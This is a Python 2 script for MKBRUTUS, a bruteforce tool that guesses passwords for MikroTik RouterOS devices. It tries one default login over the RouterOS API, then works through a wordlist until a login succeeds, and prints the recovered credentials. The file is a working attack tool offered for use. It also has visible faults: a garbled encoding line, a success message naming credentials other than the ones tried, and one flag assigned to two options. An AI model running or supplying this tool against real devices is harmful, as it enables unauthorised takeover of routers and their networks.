# -*- cding:o utf-8 -*-

"""
          _    _  _   _  _____  ____ _   _  ____ _   _ _____
         |  \/  || | / /| ___ \ ___ \ | | |_   _| | | /  ___|
         | .  . || |/ / | |_/ / |_/ / | | | | | | | | \ `--.
         | |\/| ||    \ | ___ \    /| | | | | | | | | |`--. \\
         | |  | || |\  \| |_/ / |\ \| |_| | | | | |_| /\__/ /
         \_|  |_/\_| \_/\____/\_| \_|\___/  \_/  \___/\____/
                      Mikrotik RouterOS Bruteforce Tool 1.0.2
           Ramiro Caire (@rcaire) & Federico Massa (@fgmassa)
                    http://mkbrutusproject.github.io/MKBRUTUS

Password bruteforcer for MikroTik devices or boxes running RouterOS

Usage:
    mkbr.py [options] <TARGET> <DICT>
    mkbr.py -h | --help
    mkbr.py --version

Options:
    -h --help,          Show this screen.
    -v --version,       Show version.
    -p --port=<port>    RouterOS port. [default: 8728]
    -u --user=<user>    User name [default: admin].
    -s --seconds=<s>    Delay seconds between retry attempts [default: 0]
    -v --verbose        Verbose mode.
"""

from docopt import docopt
import time
import sys
import codecs
import routeros_api
import pyprind


def main(args):
    print("[*] Starting bruteforce attack...")
    print("-" * 33 + "\n")

    print("[-] Trying with default credentials on RouterOS...")
    success = False

    try:
        routeros_api.connect(
            args['<TARGET>'],
            'sadmin',
            'password'
        )
        success = True
    except Exception, e:
        print e

    if success:
        alert = "[+] Login successful!!!"
        alert += " Default RouterOS credentials were not changed."
        print alert + " Log in with admin: password"
    else:
        alert = "[-] Default RouterOS credentials were unsuccessful."
        print alert
        print ""
        time.sleep(1)

        print "[-] Trying with passwords in list..."
        dict_file = codecs.open(
            args['<DICT>'],
            'rb', encoding='utf-8',
            errors='ignore'
        )

        psswd_count = dict_file.read().count('\n')
        dict_file.seek(0)
        items = 0
        my_bar = pyprind.ProgPercent(psswd_count, stream=1, monitor=True)

        for password in dict_file.readlines():
            password = password.strip('\n\r ')
            items += 1
            if args['--verbose']:
                alert = "[-] Trying {} of {} passwords".format(
                    str(items), str(psswd_count))
                print alert + " - current: " + password

            try:
                routeros_api.connect(
                    args['<TARGET>'],
                    args['--user'],
                    password
                )
                print ""
                alert = "[+] Login successful!!! "
                alert += "User: " + args['--user'] + ", Password: " + password
                print alert
                success = True
                break
            except:
                pass
            print ""
            if not args['--verbose']:
                my_bar.update()
            time.sleep(int(args['--seconds']))

        print my_bar
        print ''
        print "[*] ATTACK FINISHED!"
        if not success:
            print "Try again with a different wordlist."


if __name__ == '__main__':
    try:
        args = docopt(__doc__, version='v1.0.2')
        main(args)
    except KeyboardInterrupt:
        print '\nAborted by user. Exiting... '
        sys.exit(0)
